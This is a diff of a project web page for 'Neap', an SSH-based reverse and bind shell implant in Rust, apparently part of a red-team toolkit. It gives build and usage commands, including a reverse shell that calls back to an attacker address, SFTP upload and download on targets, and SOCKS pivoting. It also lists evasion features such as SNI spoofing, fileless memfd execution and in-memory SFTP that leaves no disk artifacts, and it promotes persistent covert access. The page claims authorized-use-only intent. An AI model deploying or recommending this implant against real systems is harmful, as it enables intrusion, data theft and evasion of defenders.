-                <div class="pill animate"><span class="dot dot-g"></span>SNI Spoofing</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Static Binary</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Password Auth</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Pubkey Auth</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Build-Time Config</div>
-                <div class="pill animate"><span class="dot dot-g"></span>UPX Compression</div>
-                <div class="pill animate"><span class="dot dot-g"></span>SFTP Shell (/exec/)</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Fileless Exec (memfd)</div>
-                <div class="pill animate"><span class="dot dot-g"></span>nexec Helper</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Auto-Daemonize</div>
-                <div class="pill animate"><span class="dot dot-g"></span>In-Memory SFTP</div>
-                <div class="pill animate"><span class="dot dot-y"></span>ConPTY (Windows)</div>
-                <div class="pill animate"><span class="dot dot-n"></span>EDR Evasion</div>
-            </div>
-            <div style="margin-top:16px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--ov0)">
-                <span style="color:var(--green)">●</span> Full &nbsp;
-                <span style="color:var(--yellow)">●</span> Linux Only &nbsp;
-                <span style="color:var(--sf2)">●</span> Not Supported
-            </div>
-        </div>
-    </section>
+<div class="grid">
+  <div class="cell full">
+    <div class="cell-header">
+      <span class="cell-num">03</span>
+      <span class="cell-name">Quickstart</span>
+    </div>
+    <h2>Build, deploy, connect.</h2>
+    <p>Neap supports both reverse and bind shell modes with TLS masquerading.</p>
+<pre class="code"><span class="c"># Build static binary</span>
+$ <span class="k">cargo build</span> --release --target x86_64-unknown-linux-musl
 
-    <!-- Architecture -->
-    <section id="architecture">
-        <div class="container">
-            <div class="section-label animate">ARCHITECTURE</div>
-            <h2 class="section-title animate" style="transition-delay:.08s">Two-mode architecture</h2>
-            <p class="section-desc animate" style="transition-delay:.16s">Bind or reverse mode sharing the same SSH session layer. Pluggable subsystems for shell, SFTP, and forwarding.</p>
-            <div class="arch-grid">
-                <div class="arch-card animate" style="transition-delay:.1s"><div class="arch-num">1</div><h3>Mode Dispatch</h3><p>Entry point selects bind or reverse based on build-time config. <code>build.sh</code> embeds connection parameters. Runtime flags for verbose and port override.</p></div>
-                <div class="arch-card animate" style="transition-delay:.2s"><div class="arch-num">2</div><h3>SSH Session</h3><p>Rust SSH implementation with channel multiplexing. Subsystem dispatch to shell (PTY), SFTP, or forwarding based on client request.</p></div>
-                <div class="arch-card animate" style="transition-delay:.3s"><div class="arch-num">3</div><h3>Shell + SFTP</h3><p>PTY via <code>openpty</code> (Linux) or <code>ConPTY</code> (Windows). Full SFTP subsystem for file operations. Job control and signal passthrough.</p></div>
-                <div class="arch-card animate" style="transition-delay:.4s"><div class="arch-num">4</div><h3>TLS + Forward</h3><p>Optional TLS wrapping with SNI spoofing via rustls. Local, remote, and dynamic SOCKS5 port forwarding through the SSH tunnel.</p></div>
-            </div>
-        </div>
-    </section>
+<span class="c"># Reverse shell (calls back to attacker)</span>
+$ <span class="k">./neap</span> reverse --host 10.10.14.5 --port 2222 --tls
 
-    <!-- Getting Started -->
-    <section style="background:var(--mantle)">
-        <div class="container">
-            <div class="section-label animate">GETTING STARTED</div>
-            <h2 class="section-title animate" style="transition-delay:.08s">Build and deploy</h2>
-            <p class="section-desc animate" style="transition-delay:.16s">Build a configured binary with one command. All parameters baked in at compile time.</p>
-            <div class="two-col">
-                <div class="terminal animate" style="transition-delay:.1s">
-                    <div class="terminal-bar"><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-label">build</span></div>
-                    <div class="terminal-body"><pre><span class="t-g">$</span> git clone https://github.com/Real-Fruit-Snacks/Neap.git
-<span class="t-g">$</span> cd Neap
-<span class="t-g">$</span> ./build.sh reverse 10.10.14.5:443 --tls
-<span class="t-p">target/release/neap (1.2 MB, static)</span></pre></div>
-                </div>
-                <div class="terminal animate" style="transition-delay:.25s">
-                    <div class="terminal-bar"><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-label">usage</span></div>
-                    <div class="terminal-body"><pre><span class="t-m"># Bind mode</span>
-<span class="t-g">$</span> neap -l -p 4444
+<span class="c"># Bind shell (listens locally)</span>
+$ <span class="k">./neap</span> bind --port 2222 --tls-cert server.crt --tls-key server.key
 
-<span class="t-m"># Reverse (auto-connects with baked config)</span>
-<span class="t-g">$</span> ./neap
+<span class="c"># Connect from attacking machine</span>
+$ <span class="k">ssh</span> -o StrictHostKeyChecking=no -p 2222 root@target</pre>
+  </div>
+</div>
 
-<span class="t-m"># SFTP</span>
-<span class="t-g">$</span> sftp -P 4444 user@target
+<div class="grid">
+  <div class="cell full">
+    <div class="cell-header">
+      <span class="cell-num">04</span>
+      <span class="cell-name">Reference</span>
+    </div>
+    <h2>Command surface and modes.</h2>
+    <p>Full reference for reverse shells, bind shells, SFTP operations, and port forwarding.</p>
+<div class="ref">
+<h4>REVERSE SHELLS</h4>
+<div><code>neap reverse &lt;host&gt;</code><span class="desc">Connect back to attacking machine</span></div>
+<div><code>--port &lt;n&gt;</code><span class="desc">Callback port (default: 2222)</span></div>
+<div><code>--tls</code><span class="desc">Enable TLS transport encryption</span></div>
+<div><code>--interval &lt;sec&gt;</code><span class="desc">Reconnection interval on failure</span></div>
 
-<span class="t-m"># In-memory SFTP (no disk artifacts)</span>
-<span class="t-g">$</span> neap --memfs -l -p 4444
+<h4>BIND SHELLS</h4>
+<div><code>neap bind</code><span class="desc">Listen for incoming SSH connections</span></div>
+<div><code>--port &lt;n&gt;</code><span class="desc">Listen port (default: 2222)</span></div>
+<div><code>--tls-cert &lt;path&gt;</code><span class="desc">TLS certificate for HTTPS masquerading</span></div>
+<div><code>--tls-key &lt;path&gt;</code><span class="desc">TLS private key</span></div>
 
-<span class="t-m"># SOCKS5 pivot</span>
-<span class="t-g">$</span> ssh -D 1080 -p 4444 user@target</pre></div>
-                </div>
-            </div>
-        </div>
-    </section>
+<h4>SFTP OPERATIONS</h4>
+<div><code>sftp -P 2222 root@target</code><span class="desc">SFTP client connection</span></div>
+<div><code>put &lt;local&gt; &lt;remote&gt;</code><span class="desc">Upload files to target</span></div>
+<div><code>get &lt;remote&gt; &lt;local&gt;</code><span class="desc">Download files from target</span></div>
+<div><code>ls · cd · mkdir · rm</code><span class="desc">Remote filesystem navigation</span></div>
 
-    <!-- Detection -->
-    <section>
-        <div class="container">
-            <div class="section-label animate">DETECTION AWARENESS</div>
-            <h2 class="section-title animate" style="transition-delay:.08s">Know the boundaries</h2>
-            <div class="two-col" style="margin-top:32px">
-                <div class="detect-card detect-hidden animate" style="transition-delay:.1s">
-                    <h3>Hidden From</h3>
-                    <ul>
-                        <li>TLS wrapping — traffic appears as HTTPS</li>
-                        <li>SNI spoofing — TLS hello mimics legitimate domain</li>
-                        <li>Static binary — no runtime dependencies to fingerprint</li>
-                        <li>Build-time config — no CLI args visible in /proc</li>
-                        <li>Auto-daemonize — no visible terminal or window</li>
-                        <li>In-memory SFTP — zero disk forensic artifacts</li>
-                        <li>SFTP shell — command exec without SSH shell channel</li>
-                        <li>Fileless exec — memfd_create on Linux, no disk touch</li>
-                        <li>SSH protocol — encrypted channel end-to-end</li>
-                    </ul>
-                </div>
-                <div class="detect-card detect-visible animate" style="transition-delay:.2s">
-                    <h3>Visible To</h3>
-                    <ul>
-                        <li>Network flow analysis — connection metadata</li>
-                        <li>SSH fingerprinting — banner and key exchange</li>
-                        <li>EDR/XDR — behavioral analysis of shell activity</li>
-                        <li>Process monitoring — shell child processes visible</li>
-                        <li>JA3/JA4 — TLS client fingerprinting</li>
-                    </ul>
-                </div>
-            </div>
-        </div>
-    </section>
+<h4>PORT FORWARDING</h4>
+<div><code>ssh -L 8080:localhost:80</code><span class="desc">Local port forwarding</span></div>
+<div><code>ssh -R 9090:localhost:22</code><span class="desc">Remote port forwarding</span></div>
+<div><code>ssh -D 1080</code><span class="desc">SOCKS5 dynamic forwarding</span></div>
+</div>
+  </div>
+</div>
 
-    <!-- Footer -->
-    <footer>
-        <div class="container">
-            <div class="footer-line"></div>
-            <div class="footer-grid">
-                <div><h4>Documentation</h4><ul><li><a href="https://github.com/Real-Fruit-Snacks/Neap#3--quickstart">Quickstart</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Neap#1--premise">Premise</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Neap#5--architecture">Architecture</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Neap/security/advisories">Security</a></li></ul></div>
-                <div><h4>Resources</h4><ul><li><a href="https://github.com/Real-Fruit-Snacks/Neap/releases/latest">Latest Release</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Neap/issues">Report Issue</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Neap/blob/main/CONTRIBUTING.md">Contributing</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Neap/blob/main/CHANGELOG.md">Changelog</a></li></ul></div>
-                <div><h4>Toolkit</h4><ul><li><a href="https://github.com/Real-Fruit-Snacks/Undertow">Undertow</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Slipstream">Slipstream</a></li><li><a href="https://github.com/Real-Fruit-Snacks/Aquifer">Aquifer</a></li><li><a href="https://github.com/Real-Fruit-Snacks">View All →</a></li></ul></div>
-                <div><h4>License</h4><p>MIT License<br>Copyright © 2026<br>Real-Fruit-Snacks</p></div>
-            </div>
-            <div class="footer-bottom">Part of the Real-Fruit-Snacks security toolkit</div>
-        </div>
-    </footer>
+<div class="grid">
+  <div class="cell">
+    <div class="cell-header">
+      <span class="cell-num">05</span>
+      <span class="cell-name">Architecture</span>
+    </div>
+    <h2>Async SSH with TLS masquerading.</h2>
+    <p>Built on tokio for async I/O, russh for SSH protocol implementation, and rustls for TLS transport. Single-threaded event loop handles all connections.</p>
+<pre class="code"><span class="c">src/</span>
+main.rs        <span class="c">// CLI interface and mode selection</span>
+ssh_server.rs  <span class="c">// SSH protocol implementation</span>
+shell.rs       <span class="c">// PTY and shell session handling</span>
+sftp.rs        <span class="c">// SFTP server implementation</span>
+tls.rs         <span class="c">// TLS masquerading layer</span>
+crypto.rs      <span class="c">// Key generation and auth</span></pre>
+  </div>
 
-    <script>
-    // Scroll animations
-    const obs=new IntersectionObserver(e=>{e.forEach(el=>{if(el.isIntersecting){el.target.classList.add('visible');obs.unobserve(el.target)}})},{threshold:.1,rootMargin:'0px 0px -50px 0px'});
-    document.querySelectorAll('.animate,.animate-scale').forEach(el=>obs.observe(el));
+  <div class="cell">
+    <div class="cell-header">
+      <span class="cell-num">06</span>
+      <span class="cell-name">Authorization</span>
+    </div>
+    <h2>Authorized engagements only.</h2>
+    <p>Neap is designed for legitimate red team operations and authorized penetration testing. Use only on systems you own or have explicit written permission to test.</p>
+    <p>Security issues should be reported through <a href="https://github.com/Real-Fruit-Snacks/Neap/security/advisories/new" style="color:var(--accent);border-bottom:1px solid currentColor">private security advisories</a>.</p>
+    <p style="color:var(--ov1);font-size:14px;font-style:italic">All connections use secure SSH protocol with proper authentication.</p>
+  </div>
+</div>
 
-    // Counter animation
-    function countUp(el){const t=parseInt(el.dataset.target),s=el.dataset.suffix||'',p=el.dataset.prefix||'',d=1500,st=performance.now();function u(n){const pr=Math.min((n-st)/d,1),e=1-Math.pow(1-pr,3);el.textContent=p+Math.floor(t*e)+s;if(pr<1)requestAnimationFrame(u)}requestAnimationFrame(u)}
-    const sobs=new IntersectionObserver(e=>{e.forEach(el=>{if(el.isIntersecting){countUp(el.target);sobs.unobserve(el.target)}})},{threshold:.5});
-    document.querySelectorAll('.stat-num').forEach(el=>sobs.observe(el));
+<div class="band">
+  <div class="band-tag">→ GET STARTED</div>
+  <h3>Persistent access<br>with minimal footprint.</h3>
+  <a class="cta" href="https://github.com/Real-Fruit-Snacks/Neap">Open repo</a>
+</div>
 
-    // Nav scroll
-    window.addEventListener('scroll',()=>{document.querySelector('.nav').style.borderBottomColor=window.scrollY>20?'rgba(49,50,68,0.8)':'rgba(49,50,68,0.3)'});
-    </script>
+<footer>
+  <span>© 2026 Real-Fruit-Snacks · MIT</span>
+  <span>
+    <a href="https://real-fruit-snacks.github.io/">all projects</a> &nbsp;·&nbsp;
+    <a href="https://github.com/Real-Fruit-Snacks/Neap">github</a> &nbsp;·&nbsp;
+    <a href="https://github.com/Real-Fruit-Snacks/Neap/security/advisories">security</a> &nbsp;·&nbsp;
+    <a href="https://github.com/Real-Fruit-Snacks/Neap/blob/main/CHANGELOG.md">changelog</a>
+  </span>
+</footer>
+
 </body>
 </html>
